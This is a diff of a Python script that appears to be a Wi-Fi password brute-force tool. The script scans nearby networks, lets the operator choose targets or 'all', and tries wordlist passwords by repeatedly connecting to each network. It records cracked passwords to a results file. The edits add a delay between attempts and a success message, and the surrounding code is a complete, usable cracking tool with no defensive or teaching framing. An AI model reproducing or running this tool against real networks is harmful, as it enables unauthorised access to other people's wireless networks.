@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os
 import platform
 import sys
@@ -20,6 +19,7 @@ except ImportError:
         sys.exit(1)
     print("pywifi installed. Restarting script...")
     os.execv(sys.executable, [sys.executable] + sys.argv)
+
 if platform.system() == "Windows":
     try:
         import comtypes
@@ -28,6 +28,7 @@ if platform.system() == "Windows":
         os.system("pip install comtypes")
         print("Please restart the script manually.")
         sys.exit(0)
+
 try:
     from rich.console import Console
     from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn
@@ -35,6 +36,7 @@ try:
 except ImportError:
     RICH_AVAILABLE = False
     print("For enhanced UI, install rich: pip install rich")
+
 if RICH_AVAILABLE:
     console = Console()
     class Colors:
@@ -56,10 +58,12 @@ else:
     c = Colors()
     def sprint(text):
         print(text)
+
 DEFAULT_WORDLIST = "passwords.txt"
 RESULTS_DIR = "results"
 TIMEOUT_SECONDS = 15
 os.makedirs(RESULTS_DIR, exist_ok=True)
+
 class WiFiScanner:
     def __init__(self, interface_index=0):
         try:
@@ -98,6 +102,7 @@ class WiFiScanner:
         self.running = True
         self.scan_results = []
         self.load_previous_attempts()
+
     def load_previous_attempts(self):
         success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
         if os.path.exists(success_file):
@@ -118,6 +123,7 @@ class WiFiScanner:
                 sprint(f"{c.GREEN}Loaded {len(self.attempted_passwords)} previously attempted combinations{c.RESET}")
             except IOError:
                 sprint(f"{c.YELLOW}Warning: Could not read previous attempt log{c.RESET}")
+
     def save_successful_attempt(self, network, password):
         self.successful_attempts[network] = {"password": password, "timestamp": datetime.now().isoformat()}
         success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
@@ -126,6 +132,7 @@ class WiFiScanner:
                 json.dump(self.successful_attempts, f, indent=2)
         except IOError:
             sprint(f"{c.YELLOW}Warning: Could not save successful attempt{c.RESET}")
+
     def log_attempt(self, network, password):
         attempt_key = f"{network}--{password}"
         self.attempted_passwords.add(attempt_key)
@@ -135,6 +142,7 @@ class WiFiScanner:
                 f.write(f"{attempt_key}\n")
         except IOError:
             pass
+
     def scan_networks(self) -> List[pywifi.Profile]:
         sprint(f"{c.CYAN}Scanning for Wi-Fi networks...{c.RESET}")
         try:
@@ -187,6 +195,7 @@ class WiFiScanner:
                 sprint(f"{c.YELLOW}This might be due to an issue with the Windows WLAN API.{c.RESET}")
                 sprint(f"{c.YELLOW}Try restarting the 'WLAN AutoConfig' service.{c.RESET}")
             return []
+
     def test_password(self, network, password, timeout=TIMEOUT_SECONDS) -> bool:
         attempt_key = f"{network.ssid}--{password}"
         if attempt_key in self.attempted_passwords:
@@ -240,8 +249,10 @@ class WiFiScanner:
             except Exception as e:
                 sprint(f"{c.RED}Error connecting to network: {str(e)}{c.RESET}")
                 return False
+            
             start_time = time.time()
             connection_successful = False
+            
             while time.time() - start_time < timeout:
                 try:
                     status = self.interface.status()
@@ -254,11 +265,18 @@ class WiFiScanner:
                     sprint(f"{c.YELLOW}Error checking connection status: {str(e)}{c.RESET}")
                     break
                 time.sleep(0.5)
+                
             try:
                 self.interface.disconnect()
             except Exception as e:
                 sprint(f"{c.YELLOW}Error disconnecting: {str(e)}{c.RESET}")
+                
+            if connection_successful:
+                sprint(f"{c.GREEN}Successfully connected with password: {password}{c.RESET}")
+                time.sleep(1)
+                
             return connection_successful
+            
         except Exception as e:
             sprint(f"{c.RED}Error during password attempt: {str(e)}{c.RESET}")
             try:
@@ -266,24 +284,35 @@ class WiFiScanner:
             except:
                 pass
             return False
+
     def crack_network(self, network, passwords: List[str], progress_callback=None):
         if network.ssid in self.successful_attempts:
             sprint(f"{c.GREEN}Network {network.ssid} already cracked: {self.successful_attempts[network.ssid]['password']}{c.RESET}")
             return True, self.successful_attempts[network.ssid]['password']
+            
         total_passwords = len(passwords)
         for i, password in enumerate(passwords):
             if progress_callback:
                 progress_callback(i, total_passwords)
+                
             if len(password) < 8 or not all(32 <= ord(ch) < 127 for ch in password):
                 continue
+                
             sprint(f"{c.YELLOW}Trying {network.ssid} with password: {password} [{i+1}/{total_passwords}]{c.RESET}")
+            
+            # Add a small delay between password attempts to moderate speed
+            time.sleep(1)
+            
             if self.test_password(network, password):
                 sprint(f"{c.GREEN}PASSWORD FOUND for {network.ssid}: {password}{c.RESET}")
                 self.save_successful_attempt(network.ssid, password)
                 return True, password
+                
             if not self.running:
                 return False, None
+                
         return False, None
+
 def display_banner():
     banner = """
     ██╗    ██╗██╗███████╗██╗      ██████╗██████╗  █████╗  ██████╗██╗  ██╗
@@ -300,8 +329,10 @@ def display_banner():
         console.print(banner, style="bold blue")
     else:
         print(banner)
+
 def clear_screen():
     os.system('cls' if platform.system() == 'Windows' else 'clear')
+
 def check_privileges():
     current_system = platform.system()
     if current_system == "Windows":
@@ -334,9 +365,11 @@ def check_privileges():
             sprint(f"{c.YELLOW}Could not check privileges. Make sure you run this as root/admin.{c.RESET}")
         return True
     return True
+
 def signal_handler(signum, frame):
     print("\nCancelling... (This may take a moment to disconnect from any networks)")
     scanner.running = False
+
 def parse_arguments():
     parser = argparse.ArgumentParser(description="Advanced Wi-Fi Password Brute Force Tool")
     parser.add_argument('-w', '--wordlist', type=str, default=DEFAULT_WORDLIST, help=f'Path to password wordlist (default: {DEFAULT_WORDLIST})')
@@ -344,6 +377,7 @@ def parse_arguments():
     parser.add_argument('-i', '--interface', type=int, default=0, help='Wireless interface index to use (default: 0)')
     parser.add_argument('-n', '--network', type=str, help='Target specific network SSID (optional)')
     return parser.parse_args()
+
 def load_passwords(wordlist_path):
     try:
         with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
@@ -356,6 +390,7 @@ def load_passwords(wordlist_path):
     except IOError:
         sprint(f"{c.RED}Error: Could not read wordlist file '{wordlist_path}'{c.RESET}")
         sys.exit(1)
+
 def crack_all_networks(scanner, networks, passwords, args):
     if RICH_AVAILABLE:
         with Progress(TextColumn("[bold blue]{task.description}"), BarColumn(), TextColumn("[bold green]{task.completed}/{task.total}"), TextColumn("[yellow]{task.fields[password]}"), TimeElapsedColumn()) as progress:
@@ -377,6 +412,7 @@ def crack_all_networks(scanner, networks, passwords, args):
                 sprint(f"{c.GREEN}CRACKED: {network.ssid} → {password}{c.RESET}")
             else:
                 sprint(f"{c.RED}FAILED: Could not crack {network.ssid}{c.RESET}")
+
 def test_pywifi_functionality():
     sprint(f"{c.CYAN}Testing pywifi functionality...{c.RESET}")
     try:
@@ -396,6 +432,7 @@ def test_pywifi_functionality():
                 sprint(f"{c.YELLOW}2. Run with sudo privileges{c.RESET}")
                 sprint(f"{c.YELLOW}3. Make sure compatible wireless adapter is present{c.RESET}")
             return False
+        
         interface = interfaces[0]
         try:
             status = interface.status()
@@ -419,28 +456,36 @@ def test_pywifi_functionality():
     except Exception as e:
         sprint(f"{c.RED}Error initializing pywifi: {str(e)}{c.RESET}")
         return False
+
 def main():
     clear_screen()
     display_banner()
+    
     if not check_privileges():
         return
+        
     args = parse_arguments()
     signal.signal(signal.SIGINT, signal_handler)
+    
     if not test_pywifi_functionality():
         sprint(f"{c.RED}pywifi functionality test failed. The script may not work correctly.{c.RESET}")
         proceed = input(f"{c.YELLOW}Do you want to continue anyway? (y/n): {c.RESET}").lower()
         if proceed not in ('y', 'yes'):
             sprint(f"{c.YELLOW}Operation cancelled by user.{c.RESET}")
             return
+            
     passwords = load_passwords(args.wordlist)
+    
     global scanner
     try:
         scanner = WiFiScanner(interface_index=args.interface)
     except Exception as e:
         sprint(f"{c.RED}Failed to initialize WiFi scanner: {str(e)}{c.RESET}")
         return
+        
     sprint(f"{c.CYAN}Scanning for networks...{c.RESET}")
     networks = scanner.scan_networks()
+    
     if not networks:
         sprint(f"{c.RED}No Wi-Fi networks found!{c.RESET}")
         if platform.system() == "Windows":
@@ -450,6 +495,7 @@ def main():
             sprint(f"{c.YELLOW}3. No networks actually in range{c.RESET}")
             sprint(f"{c.YELLOW}Try running as administrator or checking Wi-Fi status in Windows.{c.RESET}")
         return
+        
     if args.network:
         filtered_networks = [n for n in networks if args.network.lower() in n.ssid.lower()]
         if not filtered_networks:
@@ -461,6 +507,7 @@ def main():
                 sprint(f"{c.YELLOW}...and {len(networks)-10} more{c.RESET}")
             return
         networks = filtered_networks
+        
     sprint(f"{c.GREEN}Found {len(networks)} networks:{c.RESET}")
     for i, network in enumerate(networks):
         if network.ssid in scanner.successful_attempts:
@@ -469,6 +516,7 @@ def main():
             status = f"{c.YELLOW}[NOT CRACKED]{c.RESET}"
         signal_str = f", Signal: {network.signal}dBm" if hasattr(network, 'signal') else ""
         sprint(f"{i+1}. {c.CYAN}{network.ssid}{c.RESET} {status}{signal_str}")
+        
     if not args.network:
         while True:
             choice = input(f"{c.YELLOW}Enter the numbers of networks to crack (comma-separated) or 'all' for all: {c.RESET}")
@@ -483,12 +531,15 @@ def main():
                     sprint(f"{c.RED}Invalid selection! Please enter numbers between 1 and {len(networks)}.{c.RESET}")
             except ValueError:
                 sprint(f"{c.RED}Invalid input! Please enter numbers separated by commas.{c.RESET}")
+                
     sprint(f"{c.GREEN}Ready to start cracking {len(networks)} networks with {len(passwords)} passwords.{c.RESET}")
     if input(f"{c.YELLOW}Continue? (y/n): {c.RESET}").lower() not in ('y', 'yes'):
         sprint(f"{c.YELLOW}Operation cancelled by user.{c.RESET}")
         return
+        
     sprint(f"{c.GREEN}Starting password cracking...{c.RESET}")
     crack_all_networks(scanner, networks, passwords, args)
+    
     sprint(f"{c.GREEN}=== Final Report ==={c.RESET}")
     if scanner.successful_attempts:
         sprint(f"{c.GREEN}Successfully cracked {len(scanner.successful_attempts)} networks:{c.RESET}")
@@ -497,7 +548,9 @@ def main():
             sprint(f"{c.GREEN}- {ssid}: {data['password']} (cracked on {timestamp.strftime('%Y-%m-%d %H:%M:%S')}){c.RESET}")
     else:
         sprint(f"{c.RED}No networks were successfully cracked.{c.RESET}")
+        
     sprint(f"{c.YELLOW}Attempted {len(scanner.attempted_passwords)} password combinations.{c.RESET}")
     sprint(f"{c.GREEN}Results saved to {RESULTS_DIR} directory.{c.RESET}")
+
 if __name__ == "__main__":
     main()
